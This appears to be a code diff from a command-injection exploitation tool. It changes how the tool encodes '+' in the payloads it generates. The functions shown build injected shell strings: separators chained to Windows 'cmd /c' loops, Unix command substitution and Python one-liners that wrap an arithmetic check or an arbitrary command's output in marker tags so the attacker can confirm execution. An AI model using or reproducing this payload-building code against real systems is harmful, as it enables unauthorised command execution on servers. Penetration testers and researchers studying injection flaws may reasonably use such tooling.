@@ -37,14 +37,14 @@ def decision(separator, TAG, randv1, randv2):
       # 'set /p' prints its prompt without a trailing newline, so the marker arrives in one piece.
       payload = (chain +
               "for /f \"tokens=* eol=\" %i in ('cmd /c \"" +
-              "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" +
+              "set /a (" + str(randv1) + "+" + str(randv2) + ")" +
               "\"') do @" + settings.CMD_NUL + " set /p=" + TAG + "%i" + TAG + TAG
               )
   else:
     if settings.USE_BACKTICKS or settings.WAF_ENABLED:
-      math_calc = settings.CMD_SUB_PREFIX + "expr " + str(randv1) + " %2B " + str(randv2) + settings.CMD_SUB_SUFFIX
+      math_calc = settings.CMD_SUB_PREFIX + "expr " + str(randv1) + " + " + str(randv2) + settings.CMD_SUB_SUFFIX
     else:
-      math_calc = settings.CMD_SUB_PREFIX + "(" + str(randv1) + "%2B" + str(randv2) + "))"
+      math_calc = settings.CMD_SUB_PREFIX + "(" + str(randv1) + "+" + str(randv2) + "))"
 
     if settings.SKIP_CALC:
       payload = (separator +
@@ -71,9 +71,9 @@ def decision_alter_interpreter(separator, TAG, randv1, randv2):
     if chain is None:
       return ""
     if settings.SKIP_CALC:
-      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'" + TAG + "')\""
+      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'+'" + TAG + "'+'" + TAG + "')\""
     else:
-      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + TAG + "'%2B'" + TAG + "')\""
+      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'+str(int(" + str(int(randv1)) + "+" + str(int(randv2)) + "))" + "+'" + TAG + "'+'" + TAG + "')\""
 
     payload = (chain +
               "for /f \"tokens=* eol=\" %i in ('cmd /c " +
@@ -90,8 +90,8 @@ def decision_alter_interpreter(separator, TAG, randv1, randv2):
     else:
       payload = (separator +
                 settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG +
-                "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" +
-                TAG + "'%2B'" +
+                "'+str(int(" + str(int(randv1)) + "+" + str(int(randv2)) + "))" + "+'" +
+                TAG + "'+'" +
                 TAG + "')\""
                 )
 
@@ -157,8 +157,8 @@ def cmd_execution_alter_interpreter(separator, TAG, cmd):
     cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
     payload = (separator +
               settings.LINUX_PYTHON_INTERPRETER + 
-              " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'" + settings.CMD_SUB_PREFIX + "echo " + cmd_exec + settings.CMD_SUB_SUFFIX + "'%2B'" + 
-              TAG + "'%2B'" + TAG + "')\""
+              " -c \"print('" + TAG + "'+'" + TAG + "'+'" + settings.CMD_SUB_PREFIX + "echo " + cmd_exec + settings.CMD_SUB_SUFFIX + "'+'" + 
+              TAG + "'+'" + TAG + "')\""
               )
 
     payload = checks.append_custom_marker(payload, separator)
